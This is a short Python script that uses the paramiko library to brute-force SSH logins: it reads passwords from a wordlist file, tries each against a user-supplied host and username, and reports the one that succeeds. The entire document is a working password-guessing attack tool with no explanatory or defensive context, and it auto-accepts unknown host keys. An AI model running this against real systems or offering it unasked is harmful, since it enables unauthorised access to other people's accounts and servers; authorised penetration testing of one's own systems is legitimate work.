import paramiko

hostname = input("Enter the hostname: ")
username = input("Enter the username: ")

with open("wordlist.txt", "r") as f:
    passwords = f.read().splitlines()

for password in passwords:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname, username=username, password=password)
        print(f"Password {password} is correct.")
        break
    except paramiko.ssh_exception.AuthenticationException:
        print(f"Password {password} is incorrect.")